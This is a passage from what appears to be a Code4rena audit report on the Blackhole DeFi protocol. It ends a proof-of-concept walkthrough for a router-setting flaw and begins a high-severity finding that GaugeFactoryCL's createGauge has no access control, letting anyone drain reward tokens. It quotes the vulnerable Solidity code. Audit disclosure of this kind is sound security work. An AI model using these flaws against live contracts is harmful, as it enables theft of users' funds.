succeeds, and the test asserts that \u003ccode\u003emanager.getRouter()\u003c/code\u003e is now \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003etest_nonOwnerCannotCallSetRouter()\u003c/code\u003e:\u003c/strong\u003e Standard access control test.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_launchFailsIfRouterIsZero()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e first successfully calls \u003ccode\u003esetRouter(address(0))\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThen, the \u003ccode\u003eowner\u003c/code\u003e calls \u003ccode\u003emanager.testLaunch(mockPool)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evm.expectRevert(\"Router is address(0)\");\u003c/code\u003e asserts that this call reverts. The revert comes from \u003ccode\u003eMockGenesisPool.launch()\u003c/code\u003e when it detects the zero address router, demonstrating the downstream failure.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_launchSucceedsIfRouterIsValid()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEnsures the router is the initial valid one.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e calls \u003ccode\u003emanager.testLaunch(mockPool)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThis call should succeed, \u003ccode\u003emockPool.launchCalled()\u003c/code\u003e should be true, and \u003ccode\u003einitialRouter.wasCalled()\u003c/code\u003e should be true.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eHow to Run (with Foundry):\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eSave the code above as \u003ccode\u003etest/GenesisPoolManagerRouter.t.sol\u003c/code\u003e (or similar) in your Foundry project.\u003c/li\u003e\n\u003cli\u003eEnsure you have \u003ccode\u003eforge-std\u003c/code\u003e (usually included with \u003ccode\u003eforge init\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eRun the tests: \u003ccode\u003eforge test --match-test GenesisPoolManagerRouterTest -vvv\u003c/code\u003e (the \u003ccode\u003e-vvv\u003c/code\u003e provides more verbose output, including console logs if you were to add them).\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis PoC clearly demonstrates:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003esetRouter\u003c/code\u003e function’s flawed logic.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e’s inability to set a new, functional router.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e’s ability to set the router to \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe direct consequence of a zero router address leading to failed pool launches.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-28\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-5\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-16\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone\" style=\"position:relative;\"\u003e\u003ca href=\"#h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone\" aria-label=\"h 02 reward token in gaugefactorycl can be drained by anyone permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-120\"\u003e[H-02] Reward token in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e can be drained by anyone\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-176\"\u003edanzero\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-278\"\u003ea39955720\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-435\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-62\"\u003eDarkeEEandMe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-375\"\u003eKariukigithinji\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-488\"\u003emahadev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-361\"\u003emaxzuvex\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-441\"\u003ewafflewizard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-206\"\u003ewankleven\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-300\"\u003eZiusz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L59\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L59\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"findings-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#findings-description-and-impact\" aria-label=\"findings description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFindings Description and Impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eGaugeFactoryCL.sol\u003c/code\u003e contract, responsible for creating \u003ccode\u003eGaugeCL\u003c/code\u003e instances for Algebra Concentrated Liquidity pools, has a public \u003ccode\u003ecreateGauge\u003c/code\u003e function. Below is the implementation of the function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateGauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ve\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_distribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_internal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_external_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                        IGaugeManager.FarmingParam \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elast_gauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eGaugeCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ve\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_distribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_internal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_external_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_isPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e__gauges\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elast_gauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elast_gauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003eGaugeFactoryCL.createGauge\u003c/code\u003e function lacks access control, allowing any external actor to call it. This function, in turn, calls an internal \u003ccode\u003ecreateEternalFarming\u003c/code\u003e function. Below is the implementation of the \u003ccode\u003ecreateEternalFarming\u003c/code\u003e function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint24\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackTimeLibrary\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eepochNext\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eremainingTimeInCurrentEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairToDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etickSpacing\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalFarmingCustom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan 